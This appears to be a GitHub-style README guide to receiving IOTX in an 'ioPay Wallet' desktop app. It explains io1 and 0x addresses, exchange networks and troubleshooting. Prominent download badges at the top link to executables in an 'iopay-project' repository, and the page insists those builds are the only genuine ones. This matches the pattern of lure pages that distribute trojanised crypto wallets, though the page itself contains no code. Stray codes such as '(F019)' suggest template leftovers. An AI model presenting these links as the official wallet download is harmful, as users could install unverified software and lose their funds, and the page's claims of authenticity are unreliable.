![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Receiving IOTX in ioPay Wallet: Addresses, Formats and What to Share

Receiving IOTX is one screen: **open receive, choose the account, copy the address or show the QR code.** The part that decides whether the money arrives is which of the two addresses you give out.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What the wallet shows you

Each account in ioPay Wallet displays:

- the **native IoTeX address**, beginning `io1...`
- the **EVM address**, beginning `0x...`
- copy buttons for both, and a **QR code** (F019)

They are two encodings of **one key** (F031). Both receive to the same account. There is no "main" one and no conversion step - the wallet shows both precisely so you do not have to guess or use a converter ([why two forms exist](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md)).

## Which address to give out

**A native IoTeX sender, or an exchange withdrawal where you selected "IoTeX":** give the `io1...` address. It is the canonical native form and what most IoTeX services expect.

**A sender on an EVM chain, or a venue whose form wants an EVM-format address:** give the `0x...` form. Same account, different encoding.

**An exchange deposit form:** use the address *it* asks for, on the network *it* names. If it offers "IoTeX" and "Ethereum (ERC-20)" as separate networks, they deliver different assets - native IOTX in one case, an ERC-20 representation in the other.

**Never** send a screenshot of a QR code when you could copy the address, and never accept an address that arrived in a chat message from someone who says they are helping.

## Before the sender hits send

- **Chain:** they are sending on IoTeX, not on another network. A native IOTX transfer on the wrong chain is a different transaction with a different outcome.
- **Format:** the address you gave matches the field they are pasting into.
- **Amount:** for a first transfer from a new counterparty, a small test amount is worth the extra step. It costs one fee and it proves the route.

## "It says sent but nothing arrived"

Work in this order:

1. **The transaction hash.** If the sender has one, look it up - a hash proves the transaction exists and shows which address it went to.
2. **The address.** Does it match yours exactly, in the format you gave? An address that differs in one character is a different account.
3. **The chain.** Is the sender's transaction on IoTeX, or on the chain they used by mistake?
4. **The view.** Is the app connected and refreshed? [Balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) covers the stale-view case.

If the transaction is confirmed to a different address, nothing in this wallet can retrieve it - and asking the sender to "send again" sends a second transfer, not a correction.

## Address discipline that pays off

**Keep one receiving address per purpose.** A long-term account and a working account, both from the same phrase, means a leaked address does not point at your savings.

**Do not reuse an address across chains without checking.** `0x...` forms can look identical across EVM chains, and an address that is yours on IoTeX may be someone else's on another network.

**Verify on the device if you use hardware.** For receiving, the address check matters less than for sending - but a hardware wallet's displayed address is the one to trust if you ever doubt the screen. [How sending works](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-send-iotx-from-iopay-wallet.md) is the mirror image of this page.

## FAQ

**How do I receive IOTX and share my address?**
Open receive, select the account, copy the `io1...` address (or the `0x...` form if the sender needs it), and share that - plus the network name, so the sender selects the right one.

**Which of the two addresses do I give out?**
The one the sender's field expects. For native IoTeX, `io1...`; for an EVM-format field, `0x...`. They are the same account.

**Do I need to create a new address for each payment?**
No. IoTeX addresses are account identifiers, not per-payment tokens. You can reuse them; the privacy trade-off is the same as on any chain.

**Can someone reverse a payment to me?**
No. A confirmed transfer is final in both directions.

**Why does the QR show a different string than the address?**
It should not - the QR encodes the address you select. If you see a mismatch, copy the text address and verify its first and last characters before sharing it.

## Receiving from an exchange

An exchange withdrawal is where the format question actually bites, because the venue makes you choose a network before it shows you a field.

Choose **IoTeX** and the field expects the native form: paste `io1...`. Choose **Ethereum (ERC-20)** and you have asked for a different asset on a different chain - the address is an Ethereum-format one, and what arrives is a representation of IOTX rather than native IOTX (F046). Both can reach your key, and only one of them stakes, pays IoTeX gas or behaves like the balance you expected.

Two habits make this safe. Take the address from the app *after* you have seen which network the venue selected, not before. And keep the withdrawal receipt: it records the network, the amount and the transaction ID, and it is the only artifact that settles "which chain did I use" months later.

## What a first inbound transfer should prove

A first transfer from a new counterparty is a test, and it is worth treating as one: a small amount, confirmed on an explorer, matched to the address you gave. For the price of one fee it proves the whole route - format, chain, and that the sender's form accepted the address.

What it does not prove is that the sender will keep using that route. A venue that switches networks between withdrawals delivers a different asset to the same address, which is why the receipt matters more than your memory of the first success.


---

*Address forms and their equivalence follow IoTeX documentation. Both addresses for each account are a documented display feature of this build (v2.0.2).*
